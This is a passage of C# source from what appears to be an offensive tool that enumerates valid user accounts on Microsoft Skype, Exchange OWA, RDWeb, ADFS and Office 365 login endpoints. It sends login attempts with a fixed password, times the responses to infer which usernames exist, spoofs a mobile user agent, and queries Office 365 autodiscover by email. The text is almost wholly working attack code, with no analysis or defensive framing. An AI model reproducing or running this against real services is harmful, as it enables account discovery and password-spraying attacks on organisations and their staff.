                        if (responseObject.ReturnTime.TotalMilliseconds < timeout)
                        {
                            UI.ThreadSafeAppendLog("[1][$] Valid user found based on timing: " + username);
                            return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = "", SipEnabled = "", Service = service };
                        }
                        else
                        {
                            //INVALID - RETURN NULL
                            return null;
                        }
                    }
                    else
                    {
                        return null;
                    }
                }
                catch (Exception e)
                {
                    if (service != MicrosoftService.Office365)
                    {
                        //We still have a response object - so do timing
                        if (responseObject.ReturnTime.TotalMilliseconds < timeout)
                        {
                            UI.ThreadSafeAppendLog("[1][$]Valid user found based on timing: " + username);
                            return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = "", SipEnabled = "", Service = service };
                        }
                        else
                        {
                            return null;
                        }
                    }
                    else
                    {
                        return null;
                    }
                }
            }
            else
            //We don't even have a response object - null
            {
                return null;
            }

        }

        private UserEnumResponseObject UserEnumSendRequest(string username, MicrosoftService service, Hostnames host, MainWindow UI, string MSISSamlRequest, string password, bool timings)
        {
            //Based on the service - format with specific username and same password for all - built on URL of chosen host for service
            //Make the request and return UserEnumResponseObject with HttpWebResponse and timing
            WebRequests userEnumRequest = null;
            if (service == MicrosoftService.Office365)
            {

            }
            else if (service == MicrosoftService.ADFS)
            {
                userEnumRequest = CreateWebRequestEnum(host.EnumURL.Url + "?client-request-id=&pullStatus=0", UI, HttpMethodChoice.GET, true);
            }
            else
            {
                userEnumRequest = CreateWebRequestEnum(host.EnumURL.Url, UI, HttpMethodChoice.GET, true);
            }

            switch (service)
            {
                case MicrosoftService.Skype:
                    userEnumRequest.postData = string.Format(ntlmXML, System.Convert.ToBase64String(System.Text.Encoding.ASCII.GetBytes(username)), System.Convert.ToBase64String(System.Text.Encoding.ASCII.GetBytes(password)));
                    userEnumRequest.request.ContentType = "text/xml; charset=utf-8";
                    UI.ThreadSafeAppendLog("[3]Skype Post Data: " + userEnumRequest.postData);
                    UI.ThreadSafeAppendLog("[3]Skype URL: " + userEnumRequest.url);
                    break;
                case MicrosoftService.Exchange:
                    userEnumRequest.postData = string.Format("destination={0}&flags=4&forcedownlevel=0&username={1}&password={2}&isUtf8=1&trusted=0", host.EnumURL.Url.Replace("auth.owa", ""), username, Uri.EscapeDataString(password));
                    userEnumRequest.request.ContentType = "application/x-www-form-urlencoded";
                    userEnumRequest.request.AllowAutoRedirect = false;
                    UI.ThreadSafeAppendLog("[3]Exchange Post Data: " + userEnumRequest.postData);
                    UI.ThreadSafeAppendLog("[3]Exchange URL: " + userEnumRequest.url);
                    break;
                case MicrosoftService.RDWeb:
                    userEnumRequest.postData = string.Format("DomainUserName={0}&UserPass={1}", username, Uri.EscapeDataString(password));
                    userEnumRequest.request.ContentType = "application/x-www-form-urlencoded";
                    UI.ThreadSafeAppendLog("[3]RDWeb Post Data: " + userEnumRequest.postData);
                    UI.ThreadSafeAppendLog("[3]RDWeb URL: " + userEnumRequest.url);
                    break;
                case MicrosoftService.ADFS:
                    if (MSISSamlRequest == null || MSISSamlRequest == "")
                    {
                        UI.ThreadSafeAppendLog("[2]SAML Data not found...");
                    }
                    else
                    {
                        userEnumRequest.request.CookieContainer = new CookieContainer();
                        userEnumRequest.request.CookieContainer.Add(userEnumRequest.request.RequestUri, new Cookie("MSISSamlRequest", MSISSamlRequest));
                        userEnumRequest.request.ContentType = "application/x-www-form-urlencoded";
                        userEnumRequest.request.AllowAutoRedirect = false;
                        userEnumRequest.postData = string.Format("UserName={0}&Password={1}&AuthMethod=FormsAuthentication", username, Uri.EscapeDataString(password));
                        UI.ThreadSafeAppendLog("[3]ADFS Post Data: " + userEnumRequest.postData);
                        UI.ThreadSafeAppendLog("[3]ADFS URL: " + userEnumRequest.url);
                    }
                    break;
                case MicrosoftService.Office365:
                    userEnumRequest = CreateWebRequestEnum("https://outlook.office365.com/autodiscover/autodiscover.json?Email=" + username + "&Protocol=ActiveSync&RedirectCount=1", UI, HttpMethodChoice.POST, false);
                    UI.ThreadSafeAppendLog("[3]O365 Request: " + "https://outlook.office365.com/autodiscover/autodiscover.json?Email=" + username + "&Protocol=ActiveSync&RedirectCount=1");
                    break;
            }

            try
            {
                if (service == MicrosoftService.Office365)
                {
                    HttpWebResponse response = userEnumRequest.MakeGETRequest();
                    return new UserEnumResponseObject() { Response = response };
                }
                else
                {
                    Stopwatch timer = new Stopwatch();
                    timer.Start();
                    UI.ThreadSafeAppendLog("[3]Making Send Request...");
                    HttpWebResponse response = userEnumRequest.MakePOSTRequest();
                    if (timings)
                    {
                        response.Close();
                    }
                    timer.Stop();
                    TimeSpan timeTaken = timer.Elapsed;
                    UI.ThreadSafeAppendLog("[3]Time Elapsed: " + timeTaken.ToString());
                    return new UserEnumResponseObject() { ReturnTime = timeTaken, Response = response };
                }
            }
            catch (Exception e)
            {
                UI.ThreadSafeAppendLog("[1]EXCEPTION: " + e.ToString());
                return null;
            }
        }

        public static WebRequests CreateWebRequestEnum(string url, MainWindow UI, HttpMethodChoice method, bool allowRedirect)
        {
            WebRequests r = new WebRequests();
            r.url = url;
            r.InitialiseRequest();
            r.UI = UI;
            r.request.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1";
            if (method == HttpMethodChoice.GET)
                r.request.Method = "GET";
            else if (method == HttpMethodChoice.POST)
                r.request.Method = "POST";

            if (allowRedirect != true)
                r.request.AllowAutoRedirect = false;

            return r;
        }

        private class UserEnumResponseObject
        {
            private TimeSpan returnTime;
            private HttpWebResponse response;

            public TimeSpan ReturnTime { get => returnTime; set => returnTime = value; }
            public HttpWebResponse Response { get => response; set => response = value; }
        }
    }
}
